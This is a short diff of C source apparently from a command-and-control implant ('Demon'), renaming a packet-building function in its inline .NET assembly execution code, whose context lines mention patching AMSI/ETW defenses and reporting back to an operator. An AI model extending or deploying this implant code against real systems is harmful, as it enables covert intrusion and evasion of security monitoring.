@@ -90,7 +90,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         PUTS( "Try to patch(less) Amsi/Etw" )
 
         PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
-        PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );
+        PkgAdIn32( PackageInfo, DOTNET_INFO_PATCHED );
 
         /* check if Amsi is loaded */
         AmsiIsLoaded = TRUE;
@@ -136,7 +136,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
     /* Let the operator know what version we are going to use. */
     PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
-    PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
+    PkgAdIn32( PackageInfo, DOTNET_INFO_NET_VERSION );
     PackageAddBytes( PackageInfo, Instance->Dotnet->NetVersion.Buffer, Instance->Dotnet->NetVersion.Length );
     PackageTransmit( PackageInfo );
     PackageInfo = NULL;
@@ -289,8 +289,8 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                     PUTS( "Apc started and assembly invoked." )
 
                     PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
-                    PackageAddInt32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
-                    PackageAddInt32( PackageInfo, ClientId.UniqueThread );
+                    PkgAdIn32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
+                    PkgAdIn32( PackageInfo, ClientId.UniqueThread );
                     PackageTransmit( PackageInfo );
 
                     // we have successfully invoked the main function of the assembly executable.
@@ -361,7 +361,7 @@ VOID DotnetPush()
             PUTS( "Event has been signaled" )
 
             Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
-            PackageAddInt32( Package, DOTNET_INFO_FINISHED );
+            PkgAdIn32( Package, DOTNET_INFO_FINISHED );
             PackageTransmit( Package );
 
             PUTS( "Dotnet Invoke thread isn't active anymore." )
